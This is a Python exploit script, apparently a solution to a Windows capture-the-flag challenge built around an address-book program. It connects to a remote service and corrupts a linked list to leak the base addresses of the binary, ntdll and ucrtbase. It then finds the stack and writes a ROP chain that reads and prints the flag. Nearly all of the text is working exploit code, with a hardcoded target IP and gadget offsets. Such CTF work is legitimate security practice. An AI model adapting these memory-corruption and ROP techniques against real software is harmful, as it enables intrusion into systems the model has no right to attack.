from pwintools import *
from pdbparse.symlookup import Lookup
import os

def inject(pe, sym, name):
    if name not in pe.symbols:
        pe.symbols[name] = next(
            sym.locs[base, limit][sym.names[base, limit].index(name)]
            for base, limit in sym.addrs
            if name in sym.names[base, limit]
        )

binary = PE('./binary.exe')
ntdll = PE('./ntdll.dll')
ucrtbase = PE('./ucrtbase.dll')
ntdll_sym = Lookup([(r'.\ntdll.pdb', 0)])
inject(ntdll, ntdll_sym, 'TlsExpansionBitMap')

os.environ["_NO_DEBUG_HEAP"] = "1"

DEBUG = False
def launch():
    global p
    if DEBUG:
        p = Process('./binary.exe')
    else:
        p = Remote('125.129.121.42', 55555)
        p.timeout = 5000
    p.newline = '\r\n'

def start_debug(wait=True):
    if DEBUG:
        p.timeout = 10000000
        p.spawn_debugger(x96dbg = True, sleep = 3)
        if wait:
            raw_input('continue?')

def menu(sel):
    p.recvuntil('7. Exit\r\n')
    p.recvuntil('> \r\n')
    p.sendline(str(sel))

def add(name, addr, city):
    menu(1)
    p.recvuntil('Name :')
    p.send(name)
    p.recvuntil('Address : ')
    p.send(addr)
    p.recvuntil('City : ')
    p.send(city)
    p.recvuntil('Add complete\r\n')

def lister(cnt, probe_leak=False):
    menu(2)
    p.recvuntil('Enter the number of addresses want to view > ')
    p.sendline(str(cnt))
    p.recvuntil('===== [')
    book_name = p.recvuntil('] Address Book List =====', drop=True)
    
    if probe_leak:
        data = ''
        while 'Number of Address' not in data:
            data = p.recvuntil('Address')
        p.recvuntil('Address Book list saved in ')
        data = int(p.recvline(keepends=False), 16)
        return data
    
    lst = []
    for i in range(cnt):
        p.recvuntil('======Address [')
        idx = int(p.recvuntil(']======', drop=True))
        p.recvuntil('Name : ')
        name = p.recvuntil('\r\nAddress : ', drop=True)
        addr = p.recvuntil('\r\nCity : ', drop=True)
        city = p.recvuntil('\r\n', drop=True)
        lst.append((idx, name, addr, city))
    p.recvuntil('Number of Address : ')
    alive_cnt = int(p.recvline(keepends=False))
    return book_name, alive_cnt, lst

def delete(idx):
    menu(3)
    p.recvuntil('which one you want to delete > ')
    p.sendline(str(idx))
    p.recvuntil('Complete\r\n')
    p.recvuntil('===== Recycle Bin =====')
    # TODO: parse
    return p.recvuntil('\r\n\r\n1. Add address Info', drop=True)

def restore(idx):
    menu(4)
    p.recvuntil('which one you want to restore > ')
    p.sendline(str(idx))
    p.recvuntil('Complete')

def modify(idx, modify_chain):
    menu(5)
    p.sendline(str(idx))
    for sel, data in modify_chain:
        p.recvuntil('> \r\n')
        p.sendline(str(sel))
        if sel == 4:
            break
        p.recvuntil('new ')
        p.recvuntil(' : ')
        p.send(data)

def empty(sel):
    menu(6)
    p.recvuntil('2. Empty Recycle Bin\r\n>')
    p.sendline(str(sel))

def exiter():
    menu(7)

launch()

p.recvuntil('Input Address Book Name > \r\n')
p.send('aaaa\n')

for i in range(1, 6):
    add(str(i)+'\n', str(i)+'\n', str(i)+'\n')
for i in range(5, 0, -1):
    data = delete(i)

# Create infinite-looping DList with stray next ptrs
restore(3)
restore(2)

book = lister(3275, True)  # just enough to overflow once
log.success('book: {:016x}'.format(book))
rbin = book + 0x250
log.info('rbin: {:016x}'.format(rbin))

# Prepare fake Elements structures
payload  = 'A'*0x98
payload += 'ZZZZZZZZ'
payload  = payload.ljust(-0x110 + 0x228, 'B')
payload += p64(book - 0x180) + 'C'*0x10 + p32(0x13371337)
payload  = payload.ljust(0x200, 'D')

# Add at AddressBook, immediately overwritting root.next (head)
add('AAAA\n', payload, 'A'*0x10+p64(book - 0x100))

fakerefs = book - 0x100 + 0x10, book - 0x100 + 0x10 + 4
def set_addr(addr):
    payload  = p32(0x3030) + p32(0x3030) # fakerefs, avoid Deref()s at main() ret
    payload  = payload.ljust(0x198, 'D')
    payload += p64(addr - 0x10)  # use lst[2][2]
    payload += 'C'*0x10 + p32(0x13371337)
    payload  = payload.ljust(0x200, '!')
    modify(1, [(2, payload), (4, None)])

set_addr(rbin)
_, _, lst = lister(3)
binary.base = u64(lst[2][2].ljust(8, '\0')) - 0x6960
assert(binary.base & 0xffff == 0)
log.success('binary: {:016x}'.format(binary.base))

set_addr(binary.base + 0x6060)
_, _, lst = lister(3)
ntdll.base = u64(lst[2][2].ljust(8, '\0')) - ntdll.symbols['RtlInitializeSListHead']
assert(ntdll.base & 0xffff == 0)
log.success('ntdll: {:016x}'.format(ntdll.base))

set_addr(binary.base + 0x62e0)
_, _, lst = lister(3)
ucrtbase.base = u64(lst[2][2].ljust(8, '\0')) - ucrtbase.symbols['_sopen_dispatch']
assert(ucrtbase.base & 0xffff == 0)
log.success('ucrtbase: {:016x}'.format(ucrtbase.base))

set_addr(ntdll.base + ntdll.symbols['TlsExpansionBitMap'] + 8)
_, _, lst = lister(3)
peb = u64(lst[2][2].ljust(8, '\0')) - 0x240
assert(peb & 0xfff == 0)
log.success('peb: {:016x}'.format(peb))

teb = peb + 0x1000
set_addr(teb + 0x8 + 2)
_, _, lst = lister(3)
stack_base = u64(('\0\0' + lst[2][2]).ljust(8, '\0'))
assert(stack_base & 0xffff == 0)
log.success('stack_base:  {:016x}'.format(stack_base))

set_addr(teb + 0x10 + 2)
_, _, lst = lister(3)
stack_limit = u64(('\0\0' + lst[2][2]).ljust(8, '\0'))
assert(stack_limit & 0xfff == 0)
log.success('stack_limit: {:016x}'.format(stack_limit))

probe = stack_base - 0xd8 - 0x200
ret_pattern = binary.base + 0x4584
log.info('Probing for pattern {:016x}...'.format(ret_pattern))
for i in range(0x200):
    log.info('probe #0x{:03x} @ {:016x}'.format(i, probe))
    set_addr(probe)
    _, _, lst = lister(3)
    leak = u64(lst[2][3].ljust(8, '\0'))
    if leak == ret_pattern:
        assert i >= 0x10  # space for rop
        break
    probe -= 0x10
ret_addr = probe + 0x200
log.success('ret@stack: {:016x}'.format(ret_addr))

# binObj:  -188h => write at -180h
# bookObj: -1c0h => write at -1b8h
refs = ret_addr - 0x180, ret_addr - 0x1b8
log.info('fake refcnt @ {:016x} and {:016x}'.format(refs[0], refs[1]))

for i in range(2):
    set_addr(refs[i])
    modify(0x13371337, [(2, p64(fakerefs[i])+'\n'), (4, None)])

"""
ntdll based
0x0000000180001029 : ret
0x000000018008df3f : pop rcx ; ret
0x000000018008b8f7 : pop rdx ; pop r11 ; ret
0x00000001800069d3 : pop r8 ; ret
0x0000000180003edc : add rsp, 0x28 ; ret

ROP Chain: classic open-read-write (+sleep)
"""

buf = book
rop = ''.join([
    p64(ntdll.base + 0x8df3f),  # ..8
    p64(3),
    p64(ntdll.base + 0x8b8f7),
    p64(buf),
    p64(0),
    p64(ntdll.base + 0x69d3),
    p64(0x100),
    p64(ucrtbase.base + ucrtbase.symbols['_read']),
    p64(ntdll.base + 0x3edc),
    p64(0),
    p64(0),
    p64(0),
    p64(0),
    p64(0),
    p64(ntdll.base + 0x8df3f),
    p64(1),
    p64(ntdll.base + 0x8b8f7),
    p64(buf),
    p64(0),
    p64(ntdll.base + 0x69d3),
    p64(0x100),
    p64(ucrtbase.base + ucrtbase.symbols['_write']),
    p64(ntdll.base + 0x3edc),
    p64(0),
    p64(0),
    p64(0),
    p64(0),
    p64(0),
    p64(ntdll.base + 0x8df3f),
    p64(0xffffffff),
    p64(ntdll.base + 0x1029),
    p64(ucrtbase.base + ucrtbase.symbols['_sleep']),
])  # and some trailing shadow space

start_debug()

assert len(rop) < 0x200
assert '\n' not in rop

set_addr(ret_addr)
modify(0x13371337, [(2, rop+'\n'), (4, None)])

exiter()

p.recvuntil('XMAS{')

flag = 'XMAS{' + p.recvuntil('}')
print(flag)

### XMAS{1$_y0ur_@ddr3ss_1n_s4nt4s_addr3ss_b00k?} ###